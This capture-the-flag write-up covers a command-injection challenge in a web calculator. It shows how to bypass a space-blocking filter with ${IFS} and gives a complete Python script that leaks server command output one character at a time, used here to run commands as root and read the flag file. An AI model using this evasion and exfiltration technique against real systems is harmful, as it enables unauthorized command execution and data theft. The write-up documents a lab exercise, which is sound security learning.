# Awesome Calculator

## Challenge description
> Checkout my new awesome calculator! It works great!

## Solution
We are giving the following website:

![](images/website.png)


### Exploration - what can we do?
Playing a bit around with it, it seems it contains some sort of command injection. I tried various inputs, eventually discovering:
* "Firewall" is hit when writing a space
* "Firewall" is hit when writing `flag.txt`. So flag is probably stored here
* System crashes on bad syntax. E.g. `$(')`
* Its a command injection, as `2+$((4))` gives the output `6`

However even though we have a command injection, we do not see any output. `4&&$(ls)` gave an interesting output, which I unfortunately could not exploit:

![](images/ls.png)

It seems like we are only limited to integers. We will return to this later.

### Defeating the whitespace
Most bash/command implementations supports the space variable `${IFS}`. Meaning that a command like `ls -l` can be encoded as `ls${IFS}-l`. Running `$((2${IFS}+4))` on the server yields `6`. Thus, we got rid of the whitespace problem. However it gets a bit tedious to write, time to automate!

### Automating input
We simply create a python script to send the input to the webserver, while replacing any whitespaces with `${IFS}`:

```python
import requests
import re
import string
import sys

# Run the command against the server and return the output
def run(cmd):
    url = "http://165.22.90.215:8093/calc"
    cmd = cmd.replace(" ", "${IFS}") # Replace spaces
    response = requests.get(url, params={'exp': cmd})

    if not response:
        return None
    
    if "firewall" in response.text:
        print("Error: Triggered firewall")
        return None

    # Remove all HTML around the output which is within <b>OUTPUT</b>
    return re.sub(r".*<b>([^<]+)\s*</b>.*", "\\1", response.text, flags=re.DOTALL).strip()

print(run("$((2+4))"))   # Yields 6
print(run("$((2+4+6))")) # Yields 12
```

### Exploiting
Now that we can run simple commands and return integers, its time to exploit it. There is probably a simpler way, but treating it like a SQL-injection and leaking a character at a time, is indeed feasible.

We use the following method, to take a character at a time, convert it to ascii and return it. It can be tested in your own terminal:
```
echo abcd|head -c 1|tail -c 1|od -N 1 -i|head -n 1|sed 's/\s\+//g'
```

Lets brake it down into parts. Essentially we use head and tail to just take the first or last character from the output:
```
$ echo abcd
abcd

$ echo abcd|head -c 1
a

$ echo abcd|head -c 1|tail -c 1
a

$ echo abcd|head -c 1|tail -c 1|od -N 1 -i
0000000          97
0000001

$ echo abcd|head -c 1|tail -c 1|od -N 1 -i|head -n 1
0000000          97

$ echo abcd|head -c 1|tail -c 1|od -N 1 -i|head -n 1|sed 's/\s\+//g'
000000097

$ echo abcd|head -c 2|tail -c 1|od -N 1 -i|head -n 1|sed 's/\s\+//g'
000000098
$ echo abcd|head -c 3|tail -c 1|od -N 1 -i|head -n 1|sed 's/\s\+//g'
000000099
```
The ascii code of `a` is indeed 97, while `b` has 98 and `c` has 99. Now its time to create a script, that can automate this.

Instead of `echo abcd` we just write the command we want. To ensure our payload is treated nicely, we wrap it as previously with `0+$(%payload%)`.

The final script, which gives us command injection with output on the server is:

```python
import requests
import re
import string
import sys

# Run the command against the server and return the output
def run(cmd):
    url = "http://165.22.90.215:8093/calc"
    cmd = cmd.replace(" ", "${IFS}") # Replace spaces
    response = requests.get(url, params={'exp': cmd})

    if not response:
        return None
    
    if "firewall" in response.text:
        print("Error: Triggered firewall")
        return None

    # Remove all HTML around the output which is within <b>OUTPUT</b>
    return re.sub(r".*<b>([^<]+)\s*</b>.*", "\\1", response.text, flags=re.DOTALL).strip()

# Run the command multiple times against the server
# For each time, return one byte at the time
def leak(cmd):
    n = run("0+$(" + cmd + "|wc -c)")

    if n == None:
        print("Error: Failed!")
        return None
    
    n = int(n)
    print("Number of characters: ", n - 1)

    # Fetch one char at a time
    for i in range(1,n):
        res = run("0+$(" + cmd + "|head -c " + str(i) + "|tail -c 1|od -N 1 -i|head -n 1|sed 's/\s\+//g')")

        char = "#"
        if int(res) > 0:
            char = chr(int(res))
        
        # Do NOT output newlines
        print(char, end='',flush=True)
    
    print("")
        
if len(sys.argv) > 1:
    leak(sys.argv[1])
else:
    leak("find / -name fla*.txt -type f")
    leak("find / -name fla*.txt -type f -exec cat {} +")
```

We run it:
```
$ python3 leak.py "id"
Number of characters:  129
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
Sweat! I've always wanted to be root. Lets find the flag:
```
$ python3 leak.py
Number of characters:  17
/srv/app/flag.txt
Number of characters:  36
CTF{Executing_Commands_Are_Awesome!}
```

---
*Writeup by Morten Eskildsen*